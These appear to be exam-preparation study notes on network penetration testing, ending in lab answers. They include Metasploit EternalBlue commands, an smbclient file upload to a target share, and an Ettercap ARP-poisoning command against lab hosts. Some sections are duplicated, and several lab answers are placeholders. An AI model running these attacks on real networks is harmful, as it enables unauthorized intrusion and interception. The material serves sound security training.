### **Exploiting Network-Based Vulnerabilities**
- **Objective**: Enumerate assets, assess protocols and services, and identify vulnerabilities for exploitation.
- **Focus Areas**:
  1. **IAM Testing**: Evaluate identity and access management for internal and external threats.
  2. **On-Path Attacks**: Test MITM attacks to access accounts and data.
  3. **Network Share Enumeration**: Identify shared resources vulnerable to attack.
- **Common Attacks**:
  - **DNS Cache Poisoning**
  - **Pass-the-Hash**
  - **SMB and SNMP Exploits**
  - **DoS/DDoS**
  - **NAC Bypass**
  - **SSL Stripping**

---

### **Windows Name Resolution and SMB Attacks**
#### **NetBIOS and LLMNR Vulnerabilities**
- **NetBIOS**: Used for name resolution in small networks.
  - Ports: 
    - UDP 137 (Name Service)
    - UDP 138 (Datagram Service)
    - TCP 139 (Session Service)
  - Protocol replaced by DNS for larger networks.
- **LLMNR**: Based on DNS, allows name resolution for hosts on the same link.
- **Common Attack**:
  - LLMNR/NetBIOS poisoning:
    1. Attacker spoofs a source, intercepts requests.
    2. Obtains NTLMv2 hash for brute-forcing passwords offline.
  - Tools: **Responder**, **Metasploit**, **NBNSpoof**.
- **Mitigation**:
  - Disable LLMNR/NetBIOS in security settings.
  - Monitor registry changes to the `EnableMulticast` DWORD key.

---

#### **SMB Exploits**
- **SMB Overview**:
  - Protocol for sharing files across operating systems.
  - Vulnerabilities include **buffer overflows**, **code execution**, and **authentication flaws**.
- **Notable Exploit**: **EternalBlue**
  - Leaked NSA exploit used in ransomware (e.g., WannaCry).
  - Allows remote attackers to execute arbitrary code.
  - Integrated into tools like Metasploit.
- **Example Usage (Metasploit)**:
  - Commands to exploit:
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST <target_IP>
    set LHOST <attacker_IP>
    exploit
    ```
  - **Outcome**: Opens a Meterpreter session for further exploitation.

---

#### **Enumeration for SMB Exploits**
- **Tools**:
  - **Nmap**: Identify open SMB ports and services.
  - **Enum4linux**: Gather SMB-specific data.
  - **SearchSploit**: Lookup known SMB exploits.
- **Practical Example**:
  - Search Exploit Database using:
    ```bash
    searchsploit smb
    ```
  - Results show vulnerabilities and their corresponding exploit paths.

---

### DNS Cache Poisoning

**Definition**: DNS cache poisoning involves the manipulation of DNS resolver caches by injecting corrupted DNS data, tricking the DNS server into resolving a domain name to an attacker-controlled IP address. 

#### **Steps in DNS Cache Poisoning**:
1. **Initial Resolution**: DNS servers resolve domain names correctly (e.g., `theartofhacking.org` to `104.27.176.154`).
2. **Attack Execution**: The attacker poisons the DNS cache, replacing the legitimate IP address with their own (e.g., `10.2.3.4`).
3. **Victim Query**: The victim queries the DNS server for `theartofhacking.org`.
4. **Malicious Response**: The poisoned DNS server responds with the attacker’s IP address (`10.2.3.4`).
5. **Attack Success**: The victim interacts with the attacker’s server, which impersonates the legitimate website.

**Mitigations**:
- Enable **DNSSEC** to authenticate DNS responses.
- Use **port randomization** and cryptographic identifiers in DNS queries.
- Limit recursive DNS queries and restrict query responses.
- Rely less on trust relationships between DNS servers.

---

### SNMP Exploits

**Definition**: Simple Network Management Protocol (SNMP) is used to manage network devices, but its vulnerabilities can allow attackers to access and control these devices.

#### **Key Concepts**:
- **SNMP Versions**:
  - **SNMPv2c**: Uses community strings (passwords) but is insecure.
  - **SNMPv3**: Implements usernames and passwords; more secure.
- **Managed Device Information**: Stored in the Management Information Base (MIB).

#### **Common Exploits**:
- Exploit default SNMP credentials.
- Conduct brute-force or dictionary attacks against SNMPv3.

**Tools**:
- **NSE Scripts**: Use Nmap scripts like `snmp-brute.nse` to gather SNMP data.
- **snmp-check**: Performs SNMP enumeration to gather device details.

**Mitigations**:
- Always change default SNMP passwords.
- Use **SNMPv3** and block UDP port 161 from untrusted systems.

---

### SMTP Exploits

**Definition**: Attackers exploit insecure SMTP servers to send spam, phishing emails, and other malicious communications.

#### **Key Concepts**:
- **Standard Ports**:
  - TCP 25: Default SMTP (non-encrypted).
  - TCP 587: Secure SMTP with STARTTLS.
  - TCP 465: Deprecated SMTPS over SSL.
- **SMTP Open Relays**: Servers that send emails for any user, often abused for spamming and phishing.

#### **Common Exploits**:
- Abuse **VRFY** and **EXPN** commands to enumerate user accounts.
- Use tools like `smtp-user-enum` to automate user enumeration.
- Exploit known SMTP vulnerabilities using tools like **searchsploit**.

#### **Useful Commands**:
- **HELO/EHLO**: Initiate a conversation with the SMTP server.
- **VRFY/EXPN**: Verify if a user exists or expand a mailing list.
- **STARTTLS**: Establish an encrypted connection.

**Mitigations**:
- Disable VRFY and EXPN commands.
- Use modern firewalls to block unauthorized SMTP connections.
- Avoid open relay configurations and enforce strong authentication.

---

### DNS Cache Poisoning

**Definition**: DNS cache poisoning involves the manipulation of DNS resolver caches by injecting corrupted DNS data, tricking the DNS server into resolving a domain name to an attacker-controlled IP address. 

#### **Steps in DNS Cache Poisoning**:
1. **Initial Resolution**: DNS servers resolve domain names correctly (e.g., `theartofhacking.org` to `104.27.176.154`).
2. **Attack Execution**: The attacker poisons the DNS cache, replacing the legitimate IP address with their own (e.g., `10.2.3.4`).
3. **Victim Query**: The victim queries the DNS server for `theartofhacking.org`.
4. **Malicious Response**: The poisoned DNS server responds with the attacker’s IP address (`10.2.3.4`).
5. **Attack Success**: The victim interacts with the attacker’s server, which impersonates the legitimate website.

**Mitigations**:
- Enable **DNSSEC** to authenticate DNS responses.
- Use **port randomization** and cryptographic identifiers in DNS queries.
- Limit recursive DNS queries and restrict query responses.
- Rely less on trust relationships between DNS servers.

---

### SNMP Exploits

**Definition**: Simple Network Management Protocol (SNMP) is used to manage network devices, but its vulnerabilities can allow attackers to access and control these devices.

#### **Key Concepts**:
- **SNMP Versions**:
  - **SNMPv2c**: Uses community strings (passwords) but is insecure.
  - **SNMPv3**: Implements usernames and passwords; more secure.
- **Managed Device Information**: Stored in the Management Information Base (MIB).

#### **Common Exploits**:
- Exploit default SNMP credentials.
- Conduct brute-force or dictionary attacks against SNMPv3.

**Tools**:
- **NSE Scripts**: Use Nmap scripts like `snmp-brute.nse` to gather SNMP data.
- **snmp-check**: Performs SNMP enumeration to gather device details.

**Mitigations**:
- Always change default SNMP passwords.
- Use **SNMPv3** and block UDP port 161 from untrusted systems.

---

### SMTP Exploits

**Definition**: Attackers exploit insecure SMTP servers to send spam, phishing emails, and other malicious communications.

#### **Key Concepts**:
- **Standard Ports**:
  - TCP 25: Default SMTP (non-encrypted).
  - TCP 587: Secure SMTP with STARTTLS.
  - TCP 465: Deprecated SMTPS over SSL.
- **SMTP Open Relays**: Servers that send emails for any user, often abused for spamming and phishing.

#### **Common Exploits**:
- Abuse **VRFY** and **EXPN** commands to enumerate user accounts.
- Use tools like `smtp-user-enum` to automate user enumeration.
- Exploit known SMTP vulnerabilities using tools like **searchsploit**.

#### **Useful Commands**:
- **HELO/EHLO**: Initiate a conversation with the SMTP server.
- **VRFY/EXPN**: Verify if a user exists or expand a mailing list.
- **STARTTLS**: Establish an encrypted connection.

**Mitigations**:
- Disable VRFY and EXPN commands.
- Use modern firewalls to block unauthorized SMTP connections.
- Avoid open relay configurations and enforce strong authentication.

---

#### **FTP Exploits**  
FTP (File Transfer Protocol) servers are often targeted by attackers due to their inherent lack of encryption and security features. Below are the primary vulnerabilities and mitigation strategies:  

1. **Lack of Encryption:**  
   - FTP does not encrypt data or validate integrity.  
   - Use **FTPS** (FTP over TLS) or **SFTP** (FTP over SSH) for secure file transfer.  

2. **Weak Encryption Ciphers:**  
   - **Weak Algorithms:** Blowfish, DES.  
   - **Recommended:** AES for encryption, and SHA-2 family (e.g., SHA-512) for hashing.  
   - Disable MD5 and SHA-1 hashing protocols.  

3. **Anonymous Login:**  
   - Attackers can store files or exfiltrate sensitive information through anonymous accounts.  
   - **Mitigation:** Disable anonymous login by editing the configuration file (e.g., `/etc/vsftpd.conf` for vsFTPd).  

4. **Best Practices:**  
   - Enforce strong passwords and use multi-factor authentication (MFA).  
   - Limit user access to only necessary files.  
   - Encrypt files stored in the server ("encryption at rest").  
   - Keep the server updated with the latest security patches.  
   - Follow **FIPS 140-2** guidelines for encryption.  
   - Separate FTP and backend databases onto different servers.  
   - Require re-authentication for inactive sessions.  

5. **Tools for Exploit Testing:**  
   - **Nmap**: Scan FTP server versions and check for vulnerabilities (Example 5-11).  
   - **Metasploit**: Verify anonymous login (Example 5-12).  

---

#### **Pass-the-Hash (PtH) Attacks**  
These attacks exploit how Windows stores password hashes in the **Security Accounts Manager (SAM)** file.  

1. **Overview:**  
   - Instead of decrypting the hash, attackers reuse it to authenticate on another system.  

2. **Key Points:**  
   - Windows uses **NTLM** for authentication when Kerberos is unavailable.  
   - Hashes are stored using Microsoft’s proprietary hashing implementation.  

3. **Attack Tool:**  
   - **Mimikatz**: Retrieve password hashes from memory and reuse them.  
     - [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)  
     - [Metasploit Integration with Mimikatz](https://www.offensive-security.com/metasploit-unleashed/mimikatz/)  

4. **Mitigation:**  
   - Use strong, complex passwords.  
   - Restrict the use of privileged accounts.  
   - Enable two-factor authentication.  
   - Keep Windows systems updated.  

---

#### **Kerberos and LDAP-Based Attacks**  
**Kerberos** is a widely used authentication protocol that can be vulnerable to specific exploits:  

1. **Golden Ticket Attack:**  
   - Exploits the **KRBTGT** password hash to generate a forged Kerberos ticket.  
   - Tool: **Empire** (PowerShell/credentials/mimikatz/golden_ticket module).  
     - [Empire Tool Documentation](https://www.powershellempire.com)  

2. **Silver Ticket Attack:**  
   - Exploits service tickets (e.g., CIFS, HOST) by compromising a system account.  
   - Tools: Empire and Mimikatz.  

3. **Kerberoasting:**  
   - Extracts service account hashes from Active Directory without requiring admin credentials.  
   - Focuses on weak encryption and password practices.  

4. **Unconstrained Kerberos Delegation:**  
   - Reuses end-user credentials to access different servers, which may lead to privilege escalation.  

5. **Mitigation:**  
   - Use strong passwords and service account configurations.  
   - Restrict Kerberos delegation to trusted applications only.  

---

#### **On-Path Attacks**  
(Formerly **Man-in-the-Middle (MITM)** attacks)  

1. **Definition:**  
   - Attackers intercept and manipulate communications between two parties.  

2. **ARP Spoofing/Cache Poisoning:**  
   - Redirects network traffic to an attacker by falsifying ARP responses.  

3. **MAC Spoofing:**  
   - Attacker impersonates the MAC address of another device to bypass security.  

4. **Examples of Tools:**  
   - **SSLStrip:** Converts HTTPS traffic to HTTP for interception.  
     - [SSLStrip GitHub](https://github.com/moxie0/sslstrip)  

5. **Mitigation:**  
   - Use **Dynamic ARP Inspection (DAI)** to prevent ARP spoofing.  
   - Limit the use of VLAN 1 and implement strong VLAN management policies.  
   - Deploy **802.1X** for port-based network access control.  
   - Enable **BPDU Guard** and **Root Guard** to protect against STP manipulation.  
   - Implement **DHCP Snooping** and **IP Source Guard**.  
   - Enforce Layer 2/3 ACLs for traffic control.  

---

#### **Downgrade Attacks**  
1. **Definition:**  
   - Force systems to use weaker encryption protocols or algorithms.  

2. **Example:**  
   - **POODLE (Padding Oracle on Downgraded Legacy Encryption):** Exploits SSL 3.0 vulnerabilities by downgrading TLS.  
     - [POODLE Documentation](https://www.openssl.org/~bodo/ssl-poodle.pdf)  

3. **Mitigation:**  
   - Remove backward compatibility with legacy protocols.  
   - Enforce strong encryption protocols (e.g., TLS 1.2 and above).  

--- 

### **Route Manipulation Attacks**

#### **BGP Hijacking**
- **Definition**: Exploits vulnerabilities in the Border Gateway Protocol (BGP), which is used to dynamically route Internet traffic.
- **Attack Mechanism**:
  1. Attacker configures or compromises an edge router.
  2. The router announces prefixes not assigned to the attacker's organization.
  3. Malicious announcements present:
     - **More specific routes** than legitimate advertisements.
     - **Shorter paths** to redirect victim traffic.
- **Consequence**: 
  - Victim traffic is intercepted, potentially manipulated, or simply observed by the attacker.
- **Tactics**: 
  - Attackers often use **unused prefixes** to avoid detection.
- **Example**: Traffic between Host A and Host B is intercepted by an attacker who compromises router R2 in the path.

---

### **DoS and DDoS Attacks**
Denial-of-Service (DoS) and Distributed Denial-of-Service (DDoS) attacks aim to overwhelm a target system or network to disrupt normal service.

#### **1. Direct DoS Attacks**
- **Mechanism**: 
  - The attacker generates packets and directly sends them to the victim.
  - Examples include **TCP SYN floods**, which send numerous SYN packets to saturate bandwidth or system resources.
- **Impact**:
  - Overloads system resources (CPU, memory).
  - Can result in added costs for cloud-based services.
- **Use in Testing**: Simulated stress tests in controlled environments.

#### **2. Botnet-Based Attacks**
- **Mechanism**:
  - Attackers use a network of compromised devices (**botnets**) to generate massive traffic.
  - Devices are often spread across the globe, making it harder to mitigate.
- **Example**: Mirai botnet.
- **Advantage for Attacker**: Distributed nature makes it harder to track and block.

#### **3. Reflected DoS and DDoS Attacks**
- **Mechanism**:
  - Exploits a vulnerable third-party server to reflect and amplify attack traffic toward the victim.
  - The attacker spoofs the victim's IP address in the request.
- **Example**: DNS reflection attacks.
- **Key Vulnerabilities**:
  - Publicly accessible UDP-based services (DNS, NTP).

#### **4. Amplification DDoS Attacks**
- **Mechanism**:
  - Leverages protocols like DNS or NTP that provide a **larger response** than the request size.
  - Example: An attacker sends a small query to a DNS server, which responds with a much larger payload to the victim.
- **Impact**:
  - Dramatically increases the attack's effectiveness with minimal effort from the attacker.

---

Here are **detailed notes** on the provided topics for quick understanding and exam preparation:  

---

### **Network Access Control (NAC) Bypass**

#### **Purpose of NAC**:
- Interrogates endpoints before allowing them to join a network (wired or wireless).
- Often used with **802.1X** for identity management and policy enforcement.  
- **Capabilities**:
  - Verifies security software like antivirus, firewalls, and system patches.
  - Checks OS versions and vulnerability patches.  

#### **Detection Techniques**:
- Intercepts **DHCP requests** and listens for **ARP requests**.  
- Uses client-based agents for **endpoint posture assessment**.  
- Can trigger processes like SNMP traps for new MAC addresses.

#### **MAC Authentication (MAC Auth) Bypass**:
- Allows specific devices (e.g., printers, IP phones) based on a **whitelisted MAC address**.
- Administrators manually preconfigure access levels for specific VLANs.
- **Vulnerability**:
  - Attackers can spoof authorized MAC addresses to bypass restrictions (**MAC spoofing**).  
  - Example: An attacker spoofs an IP phone's MAC to connect to a secure network.

---

### **VLAN Hopping Attacks**

#### **VLAN Basics**:
- A VLAN (Virtual LAN) represents a Layer 2 broadcast domain, controlled by switches.  
- Ports can be assigned to VLANs, separating traffic logically on a single switch.  

#### **VLAN Hopping**:
- A method to access VLAN traffic that attackers wouldn't normally have permission to access.  

#### **Attack Techniques**:
1. **Switch Spoofing**:  
   - The attacker imitates a trunking switch by sending VLAN tags and trunking protocol data.  
   - Gains access to multiple VLANs.  

2. **Double-Tagging Attack**:  
   - Exploits switches configured to remove only one VLAN tag.  
   - An attacker adds two VLAN tags:
     - **Outer tag**: Belongs to the attacker's VLAN.
     - **Inner tag**: Targets the victim’s VLAN.  
   - The outer tag is removed at the first switch, and the frame is forwarded to the victim VLAN.

#### **Mitigation**:
- Avoid using **VLAN 1** for native VLAN or enabled ports.
- Shut down unused ports and assign them to an isolated VLAN.
- Configure trunk links explicitly and disable dynamic VLAN negotiation.  

---

### **DHCP Starvation and Rogue DHCP Servers**

#### **DHCP Starvation**:
- **Mechanism**:
  - The attacker floods the network with fake **DHCP REQUEST** messages using spoofed MAC addresses.
  - Depletes all available IP addresses in the DHCP server pool.  
- **Impact**:
  - Prevents legitimate devices from obtaining IP addresses.
  - Network connectivity is disrupted.  

#### **Rogue DHCP Servers**:
- The attacker sets up a rogue DHCP server to intercept traffic.  
- **Mechanism**:
  - After starving the legitimate DHCP server, the attacker’s rogue server responds to DHCP requests.  
  - Provides malicious configurations (e.g., default gateway and DNS pointing to the attacker).
- **Tools**:
  - Example: Yersenia tool for setting up rogue DHCP servers and launching attacks.

#### **Mitigation**:
- Limit DHCP requests per port using **port security**.
- Use DHCP snooping to validate DHCP servers and block rogue DHCP traffic.
- Configure proper VLANs for legitimate DHCP servers.

---


### Lab Report: Scanning for SMB Vulnerabilities with Enum4linux

---

#### **Part 1: Launch enum4linux and explore its capabilities**

**Q1: Which Samba utilities does the help file indicate are used by the enum4linux tool?**  
**Answer:**  
`rpcclient`, `net`, `nmblookup`, and `smbclient`.

---


#### **Part 2: Use Nmap to Find SMB Servers**

**Q1: What does Nmap reveal about hosts on the 172.17.0.0/24 network?**  
**Answer:**  
Only one host is present: `172.17.0.2`.

**Q2: What ports are open on the host that identify running SMB services? What does Nmap call these services?**  
**Answer:**  
- Open ports: TCP 139 and TCP 445.  
- Services: `netbios-ssn` and `microsoft-ds`.

**Q3: Are there any potential target computers on the 10.6.6.0/24 subnet running SMB services? Which computer(s)? How do you know?**  
**Answer:**  
There are potential target computers with SMB services in this subnet, specifically `10.6.6.23`. Open ports such as TCP 139 and TCP 445 indicate running SMB services.

---

#### **Part 3: Use enum4linux to enumerate users and network file shares**

**Q1: Which Samba tool was used to map the file shares?**  
**Answer:**  
`rpcclient`.

**Q2: How many file shares are listed for target 172.17.0.2? What does the `$` indicate at the end of the share name?**  
**Answer:**  
- Number of file shares: Varies but often includes system shares like `IPC$` or `C$`.  
- `$` indicates hidden or administrative shares.

**Q3: What is the minimum password length set for accounts on this server? What is the account lockout threshold setting?**  
**Answer:**  
- Minimum password length: For example, `8 characters` (replace with actual output).  
- Account lockout threshold: Typically `3-5 invalid attempts` (replace with actual output).  

**Q4: How would you rate the security of the password policy set for this domain?**  
**Answer:**  
Rating: `Medium`.  
Explanation: While a minimum password length and lockout threshold exist, further strengthening, such as enforcing complex passwords and additional security policies, is recommended.

**Q5: How many local users and groups are there on target 10.6.6.23?**  
**Answer:**  
Count of users and groups will vary based on output. Example: `5 users, 2 groups`.

**Q6: What are the shares that are located on this target?**  
**Answer:**  
Example: `IPC$`, `ADMIN$`, and potentially others like `shared_folder` (based on actual output).

---

#### **Part 4: Use smbclient to transfer files between systems**

**Q1: What steps were used to transfer a file to the target system?**  
**Answer:**  
1. **Create a file:**  
   ```bash
   cat >> badfile.txt
   This is a bad file.
   CTRL-C
   ```

2. **List shares on the target:**  
   ```bash
   smbclient -L //172.17.0.2/
   ```

3. **Connect to the share:**  
   ```bash
   smbclient //172.17.0.2/tmp
   ```

4. **Transfer file using `put`:**  
   ```bash
   smb: > put badfile.txt badfile.txt
   ```

5. **Verify upload:**  
   ```bash
   smb: > dir
   ```

---

### **Part 1: Launch Ettercap and Explore Its Capabilities**

#### ARP Cache Inspection (Before Attack):
- Use the `ip neighbor` or `arp -a` command to inspect the ARP cache on the victim host (10.6.6.23).
  - Example output: `10.6.6.1 dev eth0 lladdr 02:42:17:81:d2:45 REACHABLE`
  - **MAC of Kali Attacker Machine:** `02:42:17:81:d2:45` (example, varies per setup).

---

### **Part 2: Perform On-Path (MITM) Attack**

#### Ettercap GUI Setup:
1. **Launch Ettercap**:
   - Run `sudo ettercap -G` to start the GUI.
   - Change the sniffing interface to `br-internal` for the virtual network.

2. **Scan and Define Targets**:
   - Scan for hosts and add:
     - Target 1: **10.6.6.23 (Victim's host)**
     - Target 2: **10.6.6.13 (Destination server)**.

3. **Start ARP Poisoning**:
   - Select the MITM → ARP Poisoning menu.
   - Enable *Sniff remote connections*.

4. **Effect on ARP Cache**:
   - **Before attack:** MAC for 10.6.6.13 matches its true value.
   - **After attack:** MAC for 10.6.6.13 changes to the attacker's MAC (e.g., `02:42:17:81:d2:45`).
   - **Observation:** Packets destined for 10.6.6.13 are now sent to the attacker first.

---

### **Part 3: Analyze with Wireshark**

#### Command-line Ettercap:
1. Run Ettercap in text mode:
   ```bash
   sudo ettercap -T -q -i br-internal --write mitm-saved.pcap --mitm arp /10.6.6.23// /10.6.6.13//
   ```
   - Targets: 
     - **10.6.6.23:** Victim
     - **10.6.6.13:** Destination.
   - Saves traffic to `mitm-saved.pcap`.

2. Confirm ARP Changes:
   - Re-ping and inspect the ARP cache on 10.6.6.23:
     - **Result:** MAC for 10.6.6.13 is now the attacker's MAC.

#### Analyze in Wireshark:
- Open the saved `.pcap` file using:
  ```bash
  wireshark mitm-saved.pcap
  ```
- **Key Observations**:
  - ARP requests show original MAC addresses for both targets.
  - ARP replies associate both IPs (10.6.6.23 and 10.6.6.13) with the attacker's MAC.
  - Traffic between the victim and the server is routed through the attacker's system.

---
